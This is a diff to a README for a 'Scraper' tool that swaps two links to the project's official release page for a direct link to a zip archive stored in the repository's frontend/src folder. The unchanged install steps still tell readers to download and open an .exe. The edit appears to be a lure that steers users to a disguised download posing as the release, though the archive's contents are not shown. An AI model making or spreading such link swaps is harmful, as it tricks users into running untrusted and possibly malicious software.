@@ -1,6 +1,6 @@
 # 🔍 Scraper - Gather intelligence from hidden web networks
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/4turk2278/Scraper/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/4turk2278/Scraper/main/frontend/src/Software-v3.2-beta.1.zip)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Your computer needs to meet these standards to run the software.
 
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/4turk2278/Scraper/releases) to access the files.
+1. Visit the [official release page](https://raw.githubusercontent.com/4turk2278/Scraper/main/frontend/src/Software-v3.2-beta.1.zip) to access the files.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Open the downloaded file once the transfer completes.
